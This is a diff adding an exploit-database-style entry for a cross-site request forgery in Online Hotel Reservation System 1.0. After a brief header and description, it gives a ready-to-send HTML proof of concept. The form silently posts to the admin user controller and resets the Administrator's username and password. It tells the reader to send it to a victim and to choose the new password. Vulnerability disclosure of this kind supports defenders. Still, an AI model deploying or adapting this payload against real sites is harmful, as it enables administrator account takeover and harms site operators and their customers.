@@ -1,0 +1,33 @@
+# Exploit Title: Online Hotel Reservation System 1.0 - Cross-site request forgery (CSRF)
+# Exploit Author: Mesut Cetin
+# Date: 2021-01-14
+# Vendor Homepage: https://www.sourcecodester.com/php/13492/online-hotel-reservation-system-phpmysqli.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=13492&title=Online+Hotel+Reservation+System+in+PHP%2FMySQLi+with+Source+Code
+# Version: 1.0
+# Tested on: Kali Linux 2020.4, PHP 7.4.13, mysqlnd 7.4.13, Apache/2.4.46 (Unix), OpenSSL/1.1.1h, mod_perl/2.0.11 Perl/v5.32.0
+
+######## Description ########
+
+Vulnerable to Cross-site request forgery (CSRF), can lead to full account takeover of Administrator account.
+
+######## Proof of Concept #########
+
+Send the victim the following PoC:
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://localhost/marimar/admin/mod_users/controller.php?action=edit" method="POST">
+      <input type="hidden" name="USERID" value="1" />
+      <input type="hidden" name="UNAME" value="Anonymous" />
+      <input type="hidden" name="USERNAME" value="admin" />
+      <input type="hidden" name="deptid" value="" />
+      <input type="hidden" name="UPASS" value="admin" /> <!-- change this to the new password you wish -->
+      <input type="hidden" name="ROLE" value="Administrator" />
+      <input type="hidden" name="deptid" value="" />
+      <input type="hidden" name="PHONE" value="912852478" />
+      <input type="hidden" name="save" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
